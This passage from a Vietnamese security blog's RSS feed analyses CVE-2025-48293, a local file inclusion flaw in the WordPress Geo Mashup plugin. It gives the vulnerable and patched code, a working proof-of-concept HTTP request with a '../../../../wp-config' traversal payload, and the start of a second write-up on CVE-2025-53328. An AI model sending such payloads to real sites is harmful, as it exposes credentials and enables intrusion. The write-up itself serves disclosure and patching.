1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;B·∫£n l·ªói&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function generate_object_html( ) {&#xA;    $template_base = ( isset( $_GET[&amp;#39;template&amp;#39;] ) ) ? $_GET[&amp;#39;template&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    // other logc&#xA;    load_template( GeoMashup::locate_template( $template_base ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$template_base&lt;/code&gt; ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ &lt;code&gt;$_GET[&#39;template&#39;]&lt;/code&gt; &lt;strong&gt;kh√¥ng qua b·∫•t k·ª≥ ki·ªÉm tra/sanitize n√†o&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;K·∫øt qu·∫£ ƒë∆∞·ª£c truy·ªÅn v√†o &lt;code&gt;GeoMashup::locate_template()&lt;/code&gt; r·ªìi d√πng &lt;a href=&#34;https://developer.wordpress.org/reference/functions/load_template/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;load_template()&lt;/code&gt;&lt;/a&gt; - kh·∫£ nƒÉng k·∫ª t·∫•n c√¥ng ki·ªÉm so√°t ƒë∆∞·ªùng d·∫´n file ƒë·ªÉ include.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√°&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function generate_object_html( ) {&#xA;    $template_base = ( isset( $_GET[&amp;#39;template&amp;#39;] ) ) ? sanitize_key($_GET[&amp;#39;template&amp;#39;]) : &amp;#39;&amp;#39;;&#xA;    // other logic&#xA;    load_template( GeoMashup::locate_template( $template_base ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/sanitize_key/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;sanitize_key()&lt;/code&gt;&lt;/a&gt; ƒë∆∞·ª£c √°p d·ª•ng cho &lt;code&gt;template&lt;/code&gt; =&amp;gt; lo·∫°i b·ªè c√°c k√Ω t·ª± kh√¥ng an to√†n, ngƒÉn &lt;code&gt;../&lt;/code&gt;, &lt;code&gt;\&lt;/code&gt;, v√† c√°c k√Ω t·ª± ƒë·∫∑c bi·ªát l√†m gi·∫£m nguy c∆° &lt;strong&gt;path traversal&lt;/strong&gt; v√† &lt;strong&gt;LFI&lt;/strong&gt; t·ª´ tham s·ªë &lt;code&gt;template&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Ta ph√¢n t√≠ch logic trong &lt;code&gt;GeoMashup::locate_template()&lt;/code&gt; c√≥ ·∫£nh h∆∞·ªüng g√¨ ƒë·∫øn &lt;code&gt;$template_base&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function locate_template( $template_base ) {&#xA;    $template = locate_template( array(&amp;#34;geo-mashup-$template_base.php&amp;#34;) );&#xA; &#xA;    if ( empty( $template ) || !is_readable( $template ) ) {&#xA;        $template = path_join( GEO_MASHUP_DIR_PATH, &amp;#34;default-templates/$template_base.php&amp;#34; );&#xA;    }&#xA;    return $template;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$template&lt;/code&gt; ƒë∆∞·ª£c g√°n l·∫°i gi√° tr·ªã b·∫±ng c√°ch g·ªçi &lt;code&gt;locate_template()&lt;/code&gt; thu·ªôc file &lt;strong&gt;template.php&lt;/strong&gt; v·ªõi ƒë·ªëi s·ªë &lt;code&gt;geo-mashup-$template_base.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function locate_template( $template_names, $load = false, $load_once = true, $args = array() ) {&#xA;&#x9;global $wp_stylesheet_path, $wp_template_path;&#xA;&#xA;&#x9;if ( ! isset( $wp_stylesheet_path ) || ! isset( $wp_template_path ) ) {&#xA;&#x9;&#x9;wp_set_template_globals();&#xA;&#x9;}&#xA;&#xA;&#x9;$is_child_theme = is_child_theme();&#xA;&#xA;&#x9;$located = &amp;#39;&amp;#39;;&#xA;&#x9;foreach ( (array) $template_names as $template_name ) {&#xA;&#x9;&#x9;if ( ! $template_name ) {&#xA;&#x9;&#x9;&#x9;continue;&#xA;&#x9;&#x9;}&#xA;&#x9;&#x9;if ( file_exists( $wp_stylesheet_path . &amp;#39;/&amp;#39; . $template_name ) ) {&#xA;&#x9;&#x9;&#x9;$located = $wp_stylesheet_path . &amp;#39;/&amp;#39; . $template_name;&#xA;&#x9;&#x9;&#x9;break;&#xA;&#x9;&#x9;} elseif ( $is_child_theme &amp;amp;&amp;amp; file_exists( $wp_template_path . &amp;#39;/&amp;#39; . $template_name ) ) {&#xA;&#x9;&#x9;&#x9;$located = $wp_template_path . &amp;#39;/&amp;#39; . $template_name;&#xA;&#x9;&#x9;&#x9;break;&#xA;&#x9;&#x9;} elseif ( file_exists( ABSPATH . WPINC . &amp;#39;/theme-compat/&amp;#39; . $template_name ) ) {&#xA;&#x9;&#x9;&#x9;$located = ABSPATH . WPINC . &amp;#39;/theme-compat/&amp;#39; . $template_name;&#xA;&#x9;&#x9;&#x9;break;&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;if ( $load &amp;amp;&amp;amp; &amp;#39;&amp;#39; !== $located ) {&#xA;&#x9;&#x9;load_template( $located, $load_once, $args );&#xA;&#x9;}&#xA;&#xA;&#x9;return $located;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C√°c logic li√™n quan ƒë·∫øn s·ª± t·ªìn t·∫°i c·ªßa file khi concat v·ªõi &lt;code&gt;$template_name&lt;/code&gt; ƒë∆∞·ª£c x·ª≠ l√Ω, n·∫øu kh√¥ng t·ªìn t·∫°i th√¨ tr·∫£ v·ªÅ chu·ªói r·ªóng &lt;code&gt;&#39;&#39;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-13-cve-2025-48293/debug1.png&#34;&#xA;    alt=&#34;C√°c logic li√™n quan ƒë·∫øn s·ª± t·ªìn t·∫°i c·ªßa file&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;C√°c logic li√™n quan ƒë·∫øn s·ª± t·ªìn t·∫°i c·ªßa file&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Khi attack g·ª≠i &lt;code&gt;$_GET[&#39;template&#39;]&lt;/code&gt; ch·ª©a &lt;code&gt;../&lt;/code&gt; th√¨ m·∫∑c ƒë·ªãnh file lu√¥n kh√¥ng t·ªìn t·∫°i, lu√¥n tr·∫£ v·ªÅ &lt;code&gt;&#39;&#39;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Quay tr·ªü l·∫°i &lt;code&gt;GeoMashup::locate_template()&lt;/code&gt;, khi &lt;code&gt;$template_name&lt;/code&gt; empty v√† kh√¥ng t·ªìn t·∫°i (&lt;code&gt;!is_readable($template)&lt;/code&gt;) th√¨ ƒë∆∞·ª£c g√°n l·∫°i gi√° tr·ªã v√† tr·∫£ v·ªÅ.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;const string GEO_MASHUP_DIR_PATH = &amp;#34;/srv/www/wordpress/wp-content/plugins/geo-mashup&amp;#34;&#xA;&#xA;GEO_MASHUP_DIR_PATH.default-templates/$template_base.php&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;üëâ &lt;code&gt;GeoMashup::locate_template()&lt;/code&gt; kh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn &lt;code&gt;$template_base&lt;/code&gt; do ta ki·ªÉm so√°t, ta ti·∫øn h√†nh t√¨m c√°ch k√≠ch ho·∫°t s·ª± ki·ªán n√†y&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ( isset( $_GET[&amp;#39;output&amp;#39;] ) and &amp;#39;json&amp;#39; == $_GET[&amp;#39;output&amp;#39;] ) or empty( $_GET[&amp;#39;object_ids&amp;#39;] ) ) {&#xA;&#x9;GeoMashupQuery::generate_location_json( );&#xA;} else {&#xA;&#x9;GeoMashupQuery::generate_object_html( );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;generate_object_html()&lt;/code&gt; ch·ªâ ƒë∆∞·ª£c g·ªçi khi &lt;code&gt;$_GET[&#39;output&#39;]&lt;/code&gt; kh√¥ng ƒë∆∞·ª£c truy·ªÅn v√† &lt;code&gt;$_GET[&#39;object_ids&#39;]&lt;/code&gt; kh√¥ng empty.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;geo-query.php&lt;/strong&gt; ch·ª©a logic tr√™n ƒë∆∞·ª£c g·ªçi trong &lt;strong&gt;geo-mashup.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-13-cve-2025-48293/search1.png&#34;&#xA;    alt=&#34;geo-query.php ƒë∆∞·ª£c g·ªçi trong geo-mashup.php&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;&lt;strong&gt;geo-query.php&lt;/strong&gt; ƒë∆∞·ª£c g·ªçi trong &lt;strong&gt;geo-mashup.php&lt;/strong&gt;&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;H√†m &lt;code&gt;geo_query&lt;/code&gt; l√† callback c·ªßa action hook &lt;strong&gt;Unauthenticated&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_geo_mashup_query&amp;#39;, array( __CLASS__, &amp;#39;geo_query&amp;#39;) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi truy c·∫≠p endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi param &lt;code&gt;action=geo_mashup_query&lt;/code&gt; th√¨ callback &lt;code&gt;geo_query&lt;/code&gt; ƒë∆∞·ª£c g·ªçi.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Th√™m code v√†o &lt;code&gt;wp-config.php&lt;/code&gt; ƒë·ªÉ th·ª≠ nghi·ªám&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;echo &amp;#34;Payload&amp;#34;;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;G·ª≠i &lt;strong&gt;GET request&lt;/strong&gt; v·ªõi &lt;strong&gt;LFI&lt;/strong&gt; payload&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-ajax.php?action=geo_mashup_query&amp;amp;object_ids=2&amp;amp;template=../../../../wp-config HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: vi,en-US;q=0.7,en;q=0.3&#xA;Accept-Encoding: gzip, deflate, br&#xA;Connection: keep-alive&#xA;Upgrade-Insecure-Requests: 1&#xA;Sec-Fetch-Dest: document&#xA;Sec-Fetch-Mode: navigate&#xA;Sec-Fetch-Site: none&#xA;Sec-Fetch-User: ?1&#xA;X-PwnFox-Color: green&#xA;Priority: u=0, i&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-13-cve-2025-48293/result.png&#34;&#xA;    alt=&#34;K·∫øt qu·∫£ LFI th√†nh c√¥ng&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;K·∫øt qu·∫£ LFI th√†nh c√¥ng&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-48293 l√† LFI do d√πng input &lt;code&gt;template&lt;/code&gt; kh√¥ng ki·ªÉm so√°t khi gh√©p v√†o ƒë∆∞·ªùng d·∫´n fallback, cho ph√©p path traversal (&lt;code&gt;..&lt;/code&gt;) v√† include file ngo√†i d·ª± ƒë·ªãnh. ƒê√£ v√° trong &lt;strong&gt;v1.13.17&lt;/strong&gt; b·∫±ng &lt;code&gt;sanitize_key()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng d√πng input user tr·ª±c ti·∫øp ƒë·ªÉ build path cho include.&lt;/li&gt;&#xA;&lt;li&gt;D√πng &lt;strong&gt;whitelist&lt;/strong&gt; ho·∫∑c &lt;code&gt;sanitize_key()&lt;/code&gt; + &lt;code&gt;realpath()&lt;/code&gt; ki·ªÉm tra.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal ‚Äî Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/geo-mashup/vulnerability/wordpress-geo-mashup-plugin-1-13-16-local-file-inclusion-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Geo Mashup Plugin &amp;lt;= 1.13.16 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-53328 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-12-cve-2025-53328/</link>
      <pubDate>Sun, 12 Oct 2025 19:18:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-12-cve-2025-53328/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-12-cve-2025-53328/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Poll, Survey &amp;amp; Quiz Maker Plugin by Opinion Stage&lt;/strong&gt; phi√™n b·∫£n &lt;strong&gt;‚â§ 19.11.0&lt;/strong&gt; ch·ª©a l·ªó h·ªïng &lt;strong&gt;Local File Inclusion (CVE-2025-53328, CVSS 7.5)&lt;/strong&gt; cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh &lt;code&gt;include/require&lt;/code&gt;, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53328&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53328&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 19.11.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 19.11.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (7.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/social-polls-by-opinionstage/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Poll, Survey &amp;amp; Quiz Maker Plugin by Opinion Stage Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-important&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 1.75C0 .784.784.0 1.75.0h12.5C15.216.0 16 .784 16 1.75v9.5A1.75 1.75.0 0114.25 13H8.06l-2.573 2.573A1.458 1.458.0 013 14.543V13H1.75A1.75 1.75.0 010 11.25zm1.75-.25a.25.25.0 00-.25.25v9.5c0 .138.112.25.25.25h2a.75.75.0 01.75.75v2.19l2.72-2.72a.749.749.0 01.53-.22h6.5a.25.25.0 00.25-.25v-9.5a.25.25.0 00-.25-.25zm7 2.25v2.5a.75.75.0 01-1.5.0v-2.5a.75.75.0 011.5.0zM9 9A1 1 0 117 9a1 1 0 012 0z&#34;/&gt;&lt;/svg&gt;Quan tr·ªçng&lt;/p&gt;&lt;p&gt;M·∫∑c d√π l·ªó h·ªïng ƒë∆∞·ª£c c√¥ng b·ªë l√† &lt;strong&gt;Unauthenticated&lt;/strong&gt;, trong th·ª±c t·∫ø vi·ªác khai th√°c ƒë√≤i h·ªèi k·∫ª t·∫•n c√¥ng c√≥ quy·ªÅn n·ªôi b·ªô t·ªëi thi·ªÉu ‚Äî v√≠ d·ª• t√†i kho·∫£n &lt;strong&gt;Contributor&lt;/strong&gt; ho·∫∑c quy·ªÅn t∆∞∆°ng ƒë∆∞∆°ng tr√™n WordPress&lt;/p&gt;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 